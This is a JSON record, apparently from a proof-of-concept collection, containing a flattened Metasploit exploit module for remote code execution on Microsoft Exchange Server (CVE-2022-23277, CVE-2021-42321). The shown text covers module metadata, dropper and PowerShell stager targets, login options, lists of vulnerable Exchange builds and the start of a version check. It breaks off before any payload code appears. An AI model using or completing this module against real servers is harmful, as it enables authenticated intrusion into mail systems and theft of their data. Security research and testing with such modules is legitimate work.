{
    "text": "vul_name : Microsoft Exchange Server ChainedSerializationBinder Remote Code Execution ， vul_cve : CVE-2022-23277 , CVE-2021-42321 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'nokogiri' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， include Msf : Exploit : Powershell ， include Msf : Exploit : Remote : HTTP : Exchange ， include Msf : Exploit : Deprecated ， moved_from 'exploit/windows/http/exchange_chainedserializationbinder_denylist_typo_rce' ， super (  ， update_info (  ， info ,  ， 'Name' => 'Microsoft Exchange Server ChainedSerializationBinder RCE' ,  ， 'Description' => %q{ ， This module exploits vulnerabilities within the ChainedSerializationBinder as used in ， Exchange Server 2019 CU10 , Exchange Server 2019 CU11 , Exchange Server 2016 CU21 , and ， Exchange Server 2016 CU22 all prior to Mar22SU. ， Note that authentication is required to exploit these vulnerabilities. ， } ,  ， 'Author' => [  ， 'pwnforsp' ,  # Original Bug Discovery ， 'zcgonvh' ,  # Of 360 noah lab , Original Bug Discovery ， 'Microsoft Threat Intelligence Center' ,  # Discovery of exploitation in the wild ， 'Microsoft Security Response Center' ,  # Discovery of exploitation in the wild ， 'peterjson' ,  # Writeup ， 'testanull' ,  # PoC Exploit ， 'Grant Willcox' ,  # Aka tekwizz123. That guy in the back who took the hard work of all the people above and wrote this module : D ， 'Spencer McIntyre' ,  # CVE-2022-23277 support and DataSet gadget chains ， 'Markus Wulftange' # CVE-2022-23277 research ，  ]  ,  ， ' ，  # CVE-2021-42321 references ，  [ 'CVE' , '2021-42321' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  # CVE-2022-23277 references ，  [ 'CVE' , '2022-23277' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DisclosureDate' => '2021-12-09' ,  ， 'License' => MSF_LICENSE ,  ， 'Platform' => 'win' ,  ， 'Arch' => [ ARCH_CMD , ARCH_X86 , ARCH_X64 ]  ,  ， 'Privileged' => true ,  ， 'Targets' => [  ，  [  ， 'Windows Command' ,  ， { ， 'Arch' => ARCH_CMD ,  ， 'Type' => : win_cmd ， } ，  ]  ,  ，  [  ， 'Windows Dropper' ,  ， { ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : win_dropper ,  ， 'DefaultOptions' => { ， 'CMDSTAGER : FLAVOR' => : psh_invokewebrequest ， } ， } ，  ]  ,  ，  [  ， 'PowerShell Stager' ,  ， { ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : psh_stager ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => { ， 'SSL' => true ,  ， 'HttpClientTimeout' => 5 ,  ， 'WfsDelay' => 10 ， } ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [  ， IOC_IN_LOGS ,  # Can easily log using advice at ， CONFIG_CHANGES # Alters the user configuration on the Inbox folder to get the payload to trigger. ，  ]  ， } ， register_options (  [  ， Opt : RPORT ( 443 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'Base path' , '/' ]  )  ,  ， OptString.new ( 'HttpUsername' ,  [ true , 'The username to log into the Exchange server as' ]  )  ,  ， OptString.new ( 'HttpPassword' ,  [ true , 'The password to use to authenticate to the Exchange server' ]  )  ，  ]  )  ， end ， def post_auth? ， true ， end ， def username ， datastore [ 'HttpUsername' ]  ， end ， def password ， datastore [ 'HttpPassword' ]  ， end ， def cve_2021_42321_vuln_builds ，  [  ， '15.1.2308.8' , '15.1.2308.14' , '15.1.2308.15' ,  # Exchange Server 2016 CU21 ， '15.1.2375.7' , '15.1.2375.12' ,  # Exchange Server 2016 CU22 ， '15.2.922.7' , '15.2.922.13' , '15.2.922.14' ,  # Exchange Server 2019 CU10 ， '15.2.986.5' , '15.2.986.9' # Exchange Server 2019 CU11 ，  ]  ， end ， def cve_2022_23277_vuln_builds ，  [  ， '15.1.2308.20' ,  # Exchange Server 2016 CU21 Nov21SU ， '15.1.2308.21' ,  # Exchange Server 2016 CU21 Jan22SU ， '15.1.2375.17' ,  # Exchange Server 2016 CU22 Nov21SU ， '15.1.2375.18' ,  # Exchange Server 2016 CU22 Jan22SU ， '15.2.922.19' ,  # Exchange Server 2019 CU10 Nov21SU ， '15.2.922.20' ,  # Exchange Server 2019 CU10 Jan22SU ， '15.2.986.14' ,  # Exchange Server 2019 CU11 Nov21SU ， '15.2.986.15' # Exchange Server 2019 CU11 Jan22SU ，  ]  ， end ， def check ，  # Note we are only checking official releases here to reduce requests when checking versions with exchange_get_version ， current_build_rex = exchange_get_version ( exchange_builds : cve_2021_42321_vuln_builds + cve_2022_23277_vuln_builds ) ",
    "time": "2022.08.22"
}